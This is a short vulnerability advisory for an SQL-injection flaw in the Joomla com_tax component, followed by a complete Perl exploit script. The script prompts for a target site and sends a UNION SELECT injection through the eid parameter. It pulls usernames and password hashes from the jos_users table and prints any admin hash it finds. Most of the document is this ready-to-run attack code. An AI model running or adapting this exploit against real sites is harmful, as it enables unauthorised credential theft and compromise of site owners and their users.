source: http://www.securityfocus.com/bid/43461/info

The 'com_tax' component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 

#!/usr/bin/perl -w

########################################
#[~] Author : Fl0riX
#[!] Greetz: Sakkure And All My Friends
#[!] Script_Name: Joomla Com_tax
#[!] Exaple: >>> perl exploit.pl
             >>> http://site.com
########################################

print "\t\t                                                             \n\n";
print "\t\t| Fl0rix | Bug Researchers";
print "\t\t                                                             \n\n";
print "\t\t| Greetz: Sakkure And All My Friends";
print "\t\t                                                             \n\n";
print "\t\t|Joomla com_tax Remote SQL Inj. Exploit|\n\n";
print "\t\t                                                             \n\n";
use LWP::UserAgent;
print "\nSite ismi Target page:[http://wwww.site.com/path/]: ";
chomp(my $target=<STDIN>);
$florix="concat(username,0x3a,password)";
$sakkure="jos_users";
$un="+UNION+SELECT+";
$com="com_tax&task=fullevent";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/index.php?option=".$com."&eid=null".$un."1,".$florix.",3,4,5,6+from+".$sakkure."+--+";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n\n";
print "# Baba Buyuksun bea Bu is bu kadar xD #\n\n";
}
else{print "\n[-] Malesef Olmadi Aga bir dahaki sefere\n";
}